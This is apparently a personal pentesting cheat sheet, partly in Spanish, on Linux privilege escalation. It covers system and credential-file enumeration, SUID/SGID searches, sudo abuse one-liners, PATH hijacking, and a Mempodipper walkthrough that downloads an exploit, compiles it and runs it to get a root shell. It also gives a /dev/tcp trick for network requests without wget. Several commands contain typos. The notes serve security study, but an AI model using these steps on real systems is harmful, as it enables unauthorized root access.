# Manual Info Gathering

## System Info
```
cat /etc/issue
cat /etc/*-release
cat /etc/lsb-release  >> Debian 
lsb_release
cat /etc/redhat-release

```

## User Info
```
id
whoami
last
```

## Kernel
```
cat /proc/version
uname -a
uname -ar
uname -mrs
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz-
```
## Environmental Variables
```
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set
```
## History
```
~/.bash_history
~/.nano_history
~/.atftp_history
~/.mysql_history
~/.php_history
~/.viminfo
```
## Application Services
```
ps aux
ps -ef
top
htop
cat /etc/services
systemctl status (service)
service --status-all
```
## Check installed programs, permissions, hidden files
```
ls -lah
ls -lah /usr/bub
ls -lah /sbin
yum list installed
dpkg-query -l
dpkg -l
rmp -qa
ls -lah /usr/share/applications | awk -F '.desktop' '{ print $1}'
```
## What's Running?
```
ps aux
netstat -antup
```
## What's Installed?
```
dpkg -l
rpm -qa (centOS(OpenSUSE)
uname -a
```
## Check any unmounted services
```
cat /etc/fstab
```
## Writable by current user
```
find / perm /u=w -user `whoami` 2>/dev/null  
find / -perm /u+w,g+w -f -user `whoami` 2>/dev/null  
find / -perm /u+w -user `whoami` 2>/dev/null 
```
## Services running by root
```
ps aux | grep "root"  
/usr/bin/journalctl (Which is normally not readable by a user) << cron job? 
```
## Find symlink and what they point to
```
find / type l -ls
```
## Using spy to monitor process
```
pspy
```

# SUDO, abusing and misconfiguration
```
sudo su
sudo -l ex:  (onuma) (NOPASSWD)/bin/tar  -> sudo -u onuma /bin/tar
sudo -i
sudo /bin/bash
sudo su-
sudo ht
pkexec visudo
```

# SUID
SUID: Cuando el archiva se ejecuta, se ejecuta con el permiso del owner (chmod 4000)

SGID: Corre como el grupo del owner (chmod 2000)

Sticky bit: Solo el owner puede borrar o renombrar adentro de la carpeta.
```
find / -perm -g=s -type f 2>/dev/null    # SGID
find / -perm -u=s -type f 2>/dev/null    # SUID

find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID < full search  
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin < quicker  

-find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null  

find / perm /u=s -user "User name that you are looking for" 2>/dev/null  
```
## FInd SUID root files
```
find / -user root -perm -4000 -print 2>/dev/null
find / -type f -perm -4000 2>/dev/null
```

## Find SGID root files
```
find / -group root -perm -2000 -print 2>/dev/null
```
## Find SUID and SGID files owned by anyone
```
find / -perm -4000 -p -perm -2000 -print 2>/dev/null
```
# What's jobs are scheduled?
```
cat /etc/syslog.conf
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/cups/cupsd.conf
cat /etc/inetd.conf
cat /etc/apache2/apache2.conf
cat /etc/my.conf
cat /etc/httpd/conf/httpd.conf
cat /opt/lampp/etc/httpd.conf
ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
```
# PATH HIJACKING
Si un cron corre un binario o script sin PATH, ejemplo.
```
cat /home/cerodah
```
dependiendo de los permisos podriamos cambiar el path de quien corre el comando y poner PRIMERO el path a donde metemos nuestro evil cat

# Otros
##Mempodipper

Steve no tiene privilegios
```
steve@ubuntu:   cat /etc/shadow
permission denied
steve@ubuntu: cat /etc/issue
ubuntu 11.10
steve@ubuntu: uname -a
linux ubu 3.0.0-12-generic <  kernel vulnerable
```
Podemos buscar en exploit-db para ver el exploit, si hay. Encontramos   Mempodipper - Linux Local Root for >=2.6.39, 32-bit and 64 
```
steve@ubuntu: wget -O exploit.c http://www.exploit-db.com/download/18411
steve@ubuntu: gcc exploit.c -o exploit
steve@ubuntu: file exploit
exploit: ELF etc......
ste@ubuntu: id
uid=10000 gid=10000 groups, etc
steve@ubuntu: ./exploit
#id
uid=0(root)
```
## Wget without Wget
Información sobre el archivo /dev/tcp integrado en Bash (TCP/IP).

El siguiente script obtiene la página principal de Google:
```
exec 3<>/dev/tcp/www.google.com/80
echo -e "GET / HTTP/1.1\r\nhost: http://www.google.com\r\nConnection: close\r\n\r\n" >&3
cat <&3
```
La primera línea hace que el descriptor de archivo 3 se abra para leer y escribir en el socket TCP/IP especificado. Esta es una forma especial de la declaración ejecutiva desde la página del manual de bash.


Segunda linea: Una vez que el socket está abierto, envíamos nuestra solicutd HTTP fuera del socket con el comando echo ..> &3. La solicitud consta de:
```
GET / HTTP/1.1
host: http://www.google.com
Connection: close
```
Cada línea va seguida de un retorno de carro y una nueva línea, y todos los encabezados 2 están seguidos de una línea en blanco para señalar el final de la solicitud (todo esto es material estándar de HTTP).


Tercera línea: A continuación, leemos la respuesta del socket usando "cat <&3", que lee la respuesta y la imprime.
